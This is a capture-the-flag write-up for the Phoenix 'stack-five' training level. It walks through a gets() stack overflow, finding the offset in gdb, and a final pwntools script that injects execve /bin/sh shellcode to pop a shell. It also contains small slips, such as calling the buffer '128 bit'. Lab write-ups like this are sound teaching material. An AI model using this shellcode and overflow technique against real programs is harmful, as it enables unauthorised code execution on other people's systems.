# Challenge Source Code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

  char *gets(char *);

  void start_level() {
        char buffer[128];
          gets(buffer);
  }

  int main(int argc, char **argv) {
        printf("%s\n", BANNER);
          start_level();
  }
```
# Challenge Summary
Its a classic overflow with shellcode. Overflow the saved instruction pointer and then point to the stack containing the code.
# Challenge Theory
For this challenge it is a simple buffer overflow with a 128 bit buffer. This means a few things. 
First, the shellcode can only be 136 bytes long(still a lot of space). 
Second, the shellcode also has to ideally be null free given it comes form stdin.
Finally, with this in mind it is time to find the offset.
# Identifying the Vulnerability
To find the proper offset a currently unknown amount of characters needs to be sent into the program. For this I used a combination of pwntools cyclic() and just sending in input manually.
First manual input was used to find an overflow.
This ends up being 144 characters for overwriting the saved instruction pointer on the stack.
# Overwriting the Saved Instruction Pointer
Using pwn cyclic the pattern shown below can be generated:
```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaab
```
Putting this into a debugged session as input to the stack-five program will net.
```
$rip = 0x6261616b6261616a = "jaabkaab"
```
This reveals a 3 things.
First, the final 8 bytes of the 144 byte pattern is what controls the $rip register.
Second, the padding for the control is 136 bytes.
Third, the shellcode has to be a maximum of 136 bytes if the exploit is to be kept in the local stack frame.
# Gathering more information
There are a few more pieces of information needed to write a very basic exploit.
The register of the buffer itself is actually needed to know where to point the instruction pointer.
Running one more debugging session with just one "a" for input will net:
```
$rbp-0x80 = 0x7fffffffe5b0 
$rsp = 0x7fffffffe5b0 
```
In this extremely simple program the $rsp and $rbp-0x80 are pointing to the same address.
This is why both registers were included.
Now all of the information required to write a basic exploit is acquired.
# Writing a basic exploit
To write a basic exploit a small oneliner with an int3 SIGTRAP will be used.
This should look like:
```
python2 -c 'print b"\xCC" + b"A"*135 + b"\xb0\xe5\xff\xff\xff\x7f\x00\x00"'
run <<< $(python2 -c 'print b"\xCC" + b"A"*135 + b"\xb0\xe5\xff\xff\xff\x7f\x00\x00"')
```
Quick note the run <<< ... command is the actual command being run in gdb
# Fully Fledged Exploit in GDB
For the fully fledged exploit some shellcode is needed.
For this some shellcode from shellstorm will be used.
## Shellcode
```
; uncompiled
xor eax, eax
mov rbx, 0xFF978CD091969DD1
neg rbx
push rbx
push rsp
pop rdi
cdq
push rdx
push rdi
push rsp
pop rsi
mov al, 0x3b
syscall

; compiled hex bytes
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
```
## Writing a Basic One Liner
```
python2 -c 'print b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + b"A"*109 + b"\xb0\xe5\xff\xff\xff\x7f\x00\x00"'
run <<< $(python2 -c 'print b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + b"A"*109 + b"\xb0\xe5\xff\xff\xff\x7f\x00\x00"')
```
Running this in the gdb session will net an attempt at running /bin/sh or in this case /bin/dash because /bin/sh points to that.
This will also fail because gdb has a bunch of environment varaibles unset in order to facilitate debugging.
# Testing the Exploit Outside of GDB
Now the current exploit strategy has to be tested outside of gdb in order to verify a fully fledged exploit.
To do this the previous SIGTRAP one liner will be used and will be piped into the program outside of gdb.
When running the one liner this output is produced:
```
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Illegal instruction
```
This means the exploit needs more work.
# Gathering the Stack Address Outside of GDB
To do this userland debugging wil be needed.
A script will also be used for this needed.
A pwntools script will also be used for this.
It will be used to spawn and then pause the process; after this gdb will be attached to find any needed information.
## Pwntools Script
```
#!/usr/bin/python3
from pwn import *

proc = process('/opt/phoenix/amd64/stack-five')
proc.recv()
pause()
proc.sendline(b"A"*136 + p64(0xdeadbeef) )
proc.interactive()
```
Running the script to spawn the process and then attaching gdb will setup the environment needed to gather the rest of the required information.
With gdb attached to the spawned process hit "c" to continue, and then continue with the script to send in the input.
Doing this will net a few necessary pieces of information.
```
$rax = 0x00007fffffffe5d0 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$r8 = 0x00007fffffffe5d0 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
```
The $rax and $r8 register have the same memory address which points to the same buffer which has the payload.
The $r8 having the same value does not really matter, but it still helps for clarity.
With all of this it is time to get a basic form of code execution with int3 outside of gdb.
# Getting Basic Code Execution Outside of GDB
Getting some basic code execution will require changing the pwntools script.
## Pwntools Script
```
#!/usr/bin/python3
from pwn import *

proc = process('/opt/phoenix/amd64/stack-five')
proc.recv()
proc.sendline(b"\xCC" + b"A"*135 + p64(0x00007fffffffe5d0) )
```
Running this will net the output:
```
[+] Starting local process '/opt/phoenix/amd64/stack-five': pid 681
[*] Process '/opt/phoenix/amd64/stack-five' stopped with exit code -5 (SIGTRAP) (pid 681)
```
With all of this in mind all of the information required to write the final exploit is acquired.
# Creating the Final Exploit
```
#!/usr/bin/python3
from pwn import *

proc = process('/opt/phoenix/amd64/stack-five')
proc.recv()
exploit = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
exploit += b"A"*(136-len(exploit))
exploit += p64(0x00007fffffffe5d0)
proc.sendline(exploit)
proc.interactive()
```
This will pop the shell.
It also has a nicely formatted shell because of pwntools.
